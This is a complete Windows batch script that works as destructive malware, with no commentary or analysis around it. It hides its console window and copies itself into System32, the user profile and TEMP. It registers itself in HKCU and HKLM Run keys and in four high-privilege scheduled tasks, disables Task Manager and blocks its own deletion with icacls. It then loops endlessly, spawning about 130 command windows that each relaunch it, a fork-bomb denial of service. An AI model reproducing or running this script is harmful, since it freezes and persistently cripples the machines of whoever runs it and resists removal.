@echo off
:: Hide CMD Window
echo Set WshShell = CreateObject("WScript.Shell") > invisible.vbs
echo WshShell.Run """" ^& WScript.Arguments(0) ^& """", 0, False >> invisible.vbs
wscript.exe invisible.vbs "%~f0"

:: Define Key Paths
set script_name=loop.bat
set system_path=%windir%\System32\%script_name%
set backup_path=%USERPROFILE%\%script_name%
set temp_path=%TEMP%\%script_name%

:: Copy to Multiple Locations
copy "%~f0" "%system_path%" /Y >nul
copy "%~f0" "%backup_path%" /Y >nul
copy "%~f0" "%temp_path%" /Y >nul

:: Registry Auto-Execution for Current User and All Users
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "LoopScript" /t REG_SZ /d "%system_path%" /f >nul
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "LoopScript" /t REG_SZ /d "%system_path%" /f >nul

:: Task Scheduler Auto-Recovery at Logon and Every Minute
schtasks /create /tn "LoopScript" /tr "%system_path%" /sc onlogon /rl highest /f >nul
schtasks /create /tn "LoopMonitor" /tr "%system_path%" /sc minute /mo 1 /rl highest /f >nul

:: Task Scheduler to Ensure Persistence
schtasks /create /tn "PersistentLoopScript" /tr "%system_path%" /sc onstart /rl highest /f >nul
schtasks /create /tn "PersistentLoopMonitor" /tr "%system_path%" /sc minute /mo 1 /rl highest /f >nul

:: Disable Task Manager (Optional)
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableTaskMgr" /t REG_DWORD /d 1 /f >nul

:: Prevent Deletion (File Permissions Lock)
icacls "%system_path%" /deny Everyone:(DE,WDAC) >nul

:: Start Multiple Instances
start "" "%system_path%"
start "" "%backup_path%"
start "" "%temp_path%"

:: Open 500 CMD Windows (or as many as desired)
:loop
start cmd /c "%script_name%"
start cmd /c "%script_name%"
start cmd /c "%script_name%"
start cmd /c "%script_name%"
start cmd /c "%script_name%"
start cmd /c "%script_name%"
start cmd /c "%script_name%"
start cmd /c "%script_name%"
start cmd /c "%script_name%"
start cmd /c "%script_name%"
start cmd /c "%script_name%"
start cmd /c "%script_name%"
start cmd /c "%script_name%"
start cmd /c "%script_name%"
start cmd /c "%script_name%"
start cmd /c "%script_name%"
start cmd /c "%script_name%"
start cmd /c "%script_name%"
start cmd /c "%script_name%"
start cmd /c "%script_name%"
start cmd /c "%script_name%"
start cmd /c "%script_name%"
start cmd /c "%script_name%"
start cmd /c "%script_name%"
start cmd /c "%script_name%"
start cmd /c "%script_name%"
start cmd /c "%script_name%"
start cmd /c "%script_name%"
start cmd /c "%script_name%"
start cmd /c "%script_name%"
start cmd /c "%script_name%"
start cmd /c "%script_name%"
start cmd /c "%script_name%"
start cmd /c "%script_name%"
start cmd /c "%script_name%"
start cmd /c "%script_name%"
start cmd /c "%script_name%"
start cmd /c "%script_name%"
start cmd /c "%script_name%"
start cmd /c "%script_name%"
start cmd /c "%script_name%"
start cmd /c "%script_name%"
start cmd /c "%script_name%"
start cmd /c "%script_name%"
start cmd /c "%script_name%"
start cmd /c "%script_name%"
start cmd /c "%script_name%"
start cmd /c "%script_name%"
start cmd /c "%script_name%"
start cmd /c "%script_name%"
start cmd /c "%script_name%"
start cmd /c "%script_name%"
start cmd /c "%script_name%"
start cmd /c "%script_name%"
start cmd /c "%script_name%"
start cmd /c "%script_name%"
start cmd /c "%script_name%"
start cmd /c "%script_name%"
start cmd /c "%script_name%"
start cmd /c "%script_name%"
start cmd /c "%script_name%"
start cmd /c "%script_name%"
start cmd /c "%script_name%"
start cmd /c "%script_name%"
start cmd /c "%script_name%"
start cmd /c "%script_name%"
start cmd /c "%script_name%"
start cmd /c "%script_name%"
start cmd /c "%script_name%"
start cmd /c "%script_name%"
start cmd /c "%script_name%"
start cmd /c "%script_name%"
start cmd /c "%script_name%"
start cmd /c "%script_name%"
start cmd /c "%script_name%"
start cmd /c "%script_name%"
start cmd /c "%script_name%"
start cmd /c "%script_name%"
start cmd /c "%script_name%"
start cmd /c "%script_name%"
start cmd /c "%script_name%"
start cmd /c "%script_name%"
start cmd /c "%script_name%"
start cmd /c "%script_name%"
start cmd /c "%script_name%"
start cmd /c "%script_name%"
start cmd /c "%script_name%"
start cmd /c "%script_name%"
start cmd /c "%script_name%"
start cmd /c "%script_name%"
start cmd /c "%script_name%"
start cmd /c "%script_name%"
start cmd /c "%script_name%"
start cmd /c "%script_name%"
start cmd /c "%script_name%"
start cmd /c "%script_name%"
start cmd /c "%script_name%"
start cmd /c "%script_name%"
start cmd /c "%script_name%"
start cmd /c "%script_name%"
start cmd /c "%script_name%"
start cmd /c "%script_name%"
start cmd /c "%script_name%"
start cmd /c "%script_name%"
start cmd /c "%script_name%"
start cmd /c "%script_name%"
start cmd /c "%script_name%"
start cmd /c "%script_name%"
start cmd /c "%script_name%"
start cmd /c "%script_name%"
start cmd /c "%script_name%"
start cmd /c "%script_name%"
start cmd /c "%script_name%"
start cmd /c "%script_name%"
start cmd /c "%script_name%"
start cmd /c "%script_name%"
start cmd /c "%script_name%"
start cmd /c "%script_name%"
start cmd /c "%script_name%"
start cmd /c "%script_name%"
start cmd /c "%script_name%"
start cmd /c "%script_name%"
start cmd /c "%script_name%"
start cmd /c "%script_name%"
start cmd /c "%script_name%"
start cmd /c "%script_name%"
start cmd /c "%script_name%"
start cmd /c "%script_name%"
start cmd /c "%script_name%"
start cmd /c "%script_name%"

ping 127.0.0.1 -n 2 >nul
goto loop
